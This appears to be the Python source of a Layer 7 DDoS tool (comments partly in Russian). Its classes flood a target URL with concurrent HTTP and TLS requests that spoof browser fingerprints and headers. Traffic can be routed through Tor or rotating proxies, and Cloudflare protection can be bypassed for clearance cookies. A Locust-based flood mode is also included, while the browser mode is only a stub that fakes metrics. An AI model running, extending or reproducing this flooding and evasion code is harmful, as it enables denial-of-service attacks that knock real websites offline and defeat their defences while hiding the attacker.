import asyncio
import time
import aiohttp
import tls_client
import threading
import random
from collections import defaultdict

from config import CONFIG, logger
from utils.spoofing import BrowserProfile
from utils.proxy import get_async_tor_connector, get_random_proxy
from utils.cf_solver import get_cf_cookie
from utils.metrics_collector import MetricsCollector
from utils.bypasser import CloudflareBypasser


class Layer7Attack:
    def __init__(self, target_url, duration, attack_type):
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        self.target_url = target_url
        self.duration = duration
        self.attack_type = attack_type
        self.stop_event = threading.Event() # Используем threading.Event для межпоточной коммуникации
        self.metrics = MetricsCollector(attack_type, target_url)
        self.bypasser = None
        self.cf_cookies = None
        self.total_requests = 0
        self.successful_requests = 0
        self.start_time = 0
        self.errors = defaultdict(int)
        self.response_codes = defaultdict(int)

    async def init_bypasser(self):
        if self.attack_type in ['HTTPS-BYPASS', 'HTTP-BROWSER', 'HTTPS-ARTEMIS']:
            self.bypasser = CloudflareBypasser()
            await self.bypasser.init()
            result = await self.bypasser.bypass(self.target_url)
            self.cf_cookies = result["cookies"]
            return result["challenge_passed"]
        return True

    def update_metrics(self, latency: float, success: bool, status_code: int = 0, error_type: str = None):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        if status_code:
            self.response_codes[str(status_code)] += 1
        if error_type:
            self.errors[error_type] += 1
        
        elapsed_time = time.time() - self.start_time
        if elapsed_time == 0: elapsed_time = 1

        self.metrics.add_metric(
            requests_per_second=self.total_requests / elapsed_time,
            latency=latency * 1000,
            success_rate=(self.successful_requests / self.total_requests) * 100 if self.total_requests > 0 else 0,
            bandwidth=0,
            errors=dict(self.errors),
            response_codes=dict(self.response_codes)
        )

    async def stop(self):
        self.stop_event.set()
        if self.bypasser:
            await self.bypasser.close()
        self.metrics.stop_collecting()
        for format in ['json', 'csv', 'html']:
            filename = self.metrics.export_metrics(format)
            logger.info(f"Metrics exported to {filename}")

class TLSAttack(Layer7Attack):
    async def run(self):
        self.start_time = time.time()
        # await self.init_bypasser() # Инициализация может быть долгой, лучше делать ее лениво

        async def tls_flood():
            session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
            if CONFIG["use_proxy"]:
                proxy = get_random_proxy()
                if proxy: session.proxies = {"http": proxy['server'], "https": proxy['server']}
            
            profile = BrowserProfile()
            headers = profile.get_headers()
            cookies = profile.get_cookies()

            while not self.stop_event.is_set():
                request_start = time.time()
                try:
                    response = session.get(self.target_url, headers=headers, cookies=cookies, timeout_seconds=10)
                    latency = time.time() - request_start
                    self.update_metrics(latency, 200 <= response.status_code < 400, response.status_code)
                except Exception as e:
                    latency = time.time() - request_start
                    self.update_metrics(latency, False, error_type=type(e).__name__)
                await asyncio.sleep(random.uniform(0.01, 0.1))

        tasks = [tls_flood() for _ in range(CONFIG['threads'])]
        await asyncio.gather(*tasks)

class HTTPAttack(Layer7Attack):
    async def run(self):
        self.start_time = time.time()
        connector = await get_async_tor_connector() if CONFIG["use_tor"] else None
        
        timeout = aiohttp.ClientTimeout(total=3)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async def http_flood():
                profile = BrowserProfile()
                headers = profile.get_headers()
                cookies = profile.get_cookies()
                proxy_url = get_random_proxy()['server'] if CONFIG["use_proxy"] and not CONFIG["use_tor"] else None

                while not self.stop_event.is_set():
                    request_start = time.time()
                    try:
                        async with session.get(self.target_url, headers=headers, cookies=cookies, proxy=proxy_url, ssl=False, timeout=10) as response:
                            latency = time.time() - request_start
                            await response.read() # Важно прочитать тело ответа
                            self.update_metrics(latency, response.ok, response.status)
                    except Exception as e:
                        latency = time.time() - request_start
                        self.update_metrics(latency, False, error_type=type(e).__name__)
                    await asyncio.sleep(random.uniform(0.01, 0.1))

            tasks = [http_flood() for _ in range(CONFIG['threads'])]
            await asyncio.gather(*tasks)

class BrowserAttack(Layer7Attack):
    def __init__(self, target_url, duration, attack_type, browser_type='playwright', behaviors=None):
        super().__init__(target_url, duration, attack_type)
        self.browser_type = browser_type
        self.behaviors = behaviors if behaviors is not None else []
        logger.info(f"BrowserAttack initialized with behaviors: {self.behaviors}")

    async def run(self):
        # A placeholder run method to avoid errors.
        # The actual implementation of the browser attack would go here.
        self.start_time = time.time()
        logger.info(f"Starting BrowserAttack on {self.target_url} for {self.duration} seconds.")
        
        end_time = self.start_time + self.duration
        while not self.stop_event.is_set() and time.time() < end_time:
            # Simulate some work and metric updates
            latency = random.uniform(0.1, 0.5)
            self.update_metrics(latency, success=True, status_code=200)
            await asyncio.sleep(1)
            
        logger.info("BrowserAttack finished.")

def get_locust_attack():
    try:
        from locust import HttpUser, task, between, events
        from locust.env import Environment
    except ImportError:
        class LocustAttack(Layer7Attack):
            def run(self):
                logger.error("Locust не установлен. Выполните: pip install locust")
        return LocustAttack

    class LocustAttack(Layer7Attack):
        def run(self):
            try:
                self.start_time = time.time()
                
                @events.request.add_listener
                def on_request(name, method, response_time, response_length, exception, context, **kwargs):
                    if exception:
                        self.update_metrics(response_time / 1000, False, error_type=type(exception).__name__)
                    else:
                        self.update_metrics(response_time / 1000, True, status_code=200)

                class StressUser(HttpUser):
                    wait_time = between(1, 3)
                    host = self.target_url

                    def on_start(self):
                        if CONFIG.get('use_tor'):
                            self.client.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
                        elif CONFIG.get('use_proxy'):
                            proxy = get_random_proxy()
                            if proxy: self.client.proxies = {"http": proxy['server'], "https": proxy['server']}

                    @task
                    def stress(self):
                        profile = BrowserProfile()
                        self.client.get("/", headers=profile.get_headers(), cookies=profile.get_cookies())
                
                env = Environment(user_classes=[StressUser], events=events)
                env.create_local_runner()
                runner = env.runner
                runner.start(CONFIG['threads'], spawn_rate=10)
                
                self.stop_event.wait(timeout=self.duration)
                
                runner.quit()
                logger.info("Locust атака завершена")
            except BaseException:
                logger.exception("Критическая ошибка внутри LocustAttack.run")

        def stop(self):
            self.stop_event.set()
            self.metrics.stop_collecting()
            for format in ['json', 'csv', 'html']:
                filename = self.metrics.export_metrics(format)
                logger.info(f"Metrics exported to {filename}")
    
    return LocustAttack